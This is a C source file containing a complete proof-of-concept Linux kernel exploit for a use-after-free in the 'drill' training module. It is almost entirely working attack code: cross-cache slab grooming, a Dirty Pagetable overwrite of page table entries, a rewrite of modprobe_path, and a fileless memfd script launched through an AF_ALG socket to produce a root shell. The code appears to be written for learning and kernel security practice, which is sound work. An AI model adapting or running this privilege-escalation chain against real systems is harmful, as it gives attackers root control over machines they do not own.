/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * This PoC performs the Dirty Pagetable attack and gains LPE.
 *
 * Requirements:
 *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
 *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include "drill.h"

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - prepare the page table infrastructure
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - create a page table to reclaim the freed memory
 *  - perform uaf write using the dangling reference
 *  - change modprobe_path using the overwritten page table
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

/*==== Pagetables stuff =====*/
/* 
 * obtain MODPROBE_PATH_ADDR with `sudo cat /proc/kallsyms| grep modprobe_path`,
 * then cut off `ffffffff8`. Works only without KASLR!
 */

#define MODPROBE_PATH_ADDR 0x35ccc60
#define MODPROBE_ADDR_ALIGNED (MODPROBE_PATH_ADDR & ~0xFFF)
#define ENTRIES_AMOUNT 512 /* standart for any pagetable */
#define PHYS_AREA 0x1000 /* regular page */
#define PT_FLAGS 0x67 /* RW access for normal users and some sanity flags */
#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
		((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + \
		_pud_index_to_virt((unsigned long long)(pmd_index)) + \
		_pmd_index_to_virt((unsigned long long)(pte_index)) + \
		_pte_index_to_virt((unsigned long long)(page_index)) + \
		(unsigned long long)(byte_index)))

#define KMOD_PATH_LEN 256  /* default */
#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define SLEEPLOCK(cmp) while (cmp) { usleep(10 * 1000); }
/*===========================*/

#define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"

/* fileless approach */
char *prepare_payload(void)
{
	static char fake_modprobe[40] = {0};
	pid_t pid = getpid();

	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int shell_stdin_fd = dup(STDIN_FILENO);
	int shell_stdout_fd = dup(STDOUT_FILENO);

	if (dprintf(modprobe_script_fd, PAYLOAD, pid,
		shell_stdin_fd, pid, shell_stdout_fd) == 0) {

		perror("[-] payload fd\n");
		exit(EXIT_FAILURE);
	}

	lseek(modprobe_script_fd, 0, SEEK_SET);

	if (snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i",
		pid, modprobe_script_fd) != 0)

		printf("[+] payload written to: %s\n",fake_modprobe);

	return fake_modprobe;
}

/* 
 * refers to:
 * https://blog.theori.io/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch-2dcb8f0fae04
*/
void modprobe_trigger_sock(void)
{
		struct sockaddr_alg sa;

		int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
		if (alg_fd < 0) {
			perror("[-] crypto socker setup\n");
			exit(EXIT_FAILURE);
		}

		memset(&sa, 0, sizeof(sa));
		sa.salg_family = AF_ALG;
		strcpy((char *)sa.salg_type, "dummy");  /* dummy string */

		bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
}

long read_file(const char *filename, void *buf, size_t buflen)
{
	long fd;
	long retv;

	fd = open(filename, O_RDONLY);
	if (fd < 0) {
		perror("[-] open");
		exit(EXIT_FAILURE);
	}

	retv = read(fd, buf, buflen);
	if (retv < 0) {
		perror("[-] read");
		exit(EXIT_FAILURE);
	}
	close(fd);

	return retv;
}

/* The exploit can work without it, but will be less reliable */
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_WRITE,
			      MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;

		sleep(9999);
	}

	SLEEPLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

int prepare_tables()
{
	/* prepare infra */
	void *retv = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
					  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
	if (retv == MAP_FAILED) {
		perror("[-] mmap");
		exit(EXIT_FAILURE);
	}

	/* pre-register new tables and entries */
	for (unsigned long long i = 0; i < 512; i++) {
		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
					MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	}
	if (retv == MAP_FAILED) {
		perror("[-] mmap");
		exit(EXIT_FAILURE);
	}
	printf("[+] done, PTE is ready for allocation\n");

	return 0;
}

long UAF_write(long phys_addr, long uaf_n, long act_fd)
{
	int ret;
	char data_for_drill[16];
	long flags = PT_FLAGS;

	/* can work with multiple objects by switching between them one by one */
	snprintf(data_for_drill, sizeof(data_for_drill),
			 "0x%08lx" " %d", phys_addr + flags, 0);
	 /* switch object each 64 bytes */
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
	if (ret == EXIT_FAILURE)
		exit(EXIT_FAILURE);

	return 0;
}

static long get_modprobe_path(char *buf, size_t buflen)
{
	long size;

	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);
	if (size == buflen)
		printf("[!] read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN?\n");
	buf[size-1] = '\x00'; /* cleanup line end */
	printf("[+] current modprobe path: %s\n", buf);

	return size;
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);

	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

/* check whether address contains modprobe */
void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
						   char *modprobe_path_str, size_t modprobe_path_len)
{
	void *modprobe_addr;
	modprobe_addr = memmem(haystack_virt, haystack_len,
						   modprobe_path_str, modprobe_path_len);

	if (modprobe_addr == NULL)
		return NULL;
	printf("[+] found modprobe candidate, rewriting to check if it is false positive\n");

	/* check for modprobe overwriting by reading /proc/sys/kernel/modprobe */
	strcpy(modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0) {
		printf("[-] ^modprobe_path not overwritten!\n");
		return NULL;
	}

	return modprobe_addr;
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	void *modprobe_addr;
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	printf("[!] pin the process to a single CPU\n");
	do_cpu_pinning();

	/* extract modprobe before exploitation */
	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
	size_t modprobe_path_len = strlen(modprobe_path);

	printf("[!] prepare the page table infrastructure\n");
	prepare_tables();

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go for page table\n");

	printf("[!] create a page table to reclaim the freed memory\n");
	for (unsigned long long i=0; i < ENTRIES_AMOUNT; i++) {
		*(unsigned int*)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
	}
	printf("[+] done, vulnerable page table has been created\n");

	printf("[!] perform uaf write using the dangling reference\n");
	printf("[+] attempting to overwrite page table entries. This may kill your kernel.\n");

	long phys_addr = MODPROBE_ADDR_ALIGNED;
	/* doing rewrite to change page table entries */
	UAF_write(phys_addr, uaf_n, act_fd);
	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */

	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
		unsigned int *ptr = (unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0);
		void *virt_address = PTI_TO_VIRT(1, 0, 1, i, 0);
		unsigned int value = *ptr;

		if (value != 0xcafecafe) {
			modprobe_addr = memmem_modprobe_path(virt_address, PHYS_AREA,
												 modprobe_path, modprobe_path_len);

			if (modprobe_addr != NULL) {
				printf("[+] success, userspace modprobe address %p\n", modprobe_addr);
				printf("[!] create an exploit fd and write its path as new modprobe path via the overwritten target object\n");

				char *privesc = prepare_payload();
				strcpy(modprobe_addr, privesc);

				printf("[+] done, triggering a corrupted modprobe to launch a root shell\n");
				modprobe_trigger_sock();
			}
		}
	}

end:
	printf("[!] finishing this PoC exploit\n");

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
		printf("  closed the drill_act act_fd\n");
	}

	return ret;
}
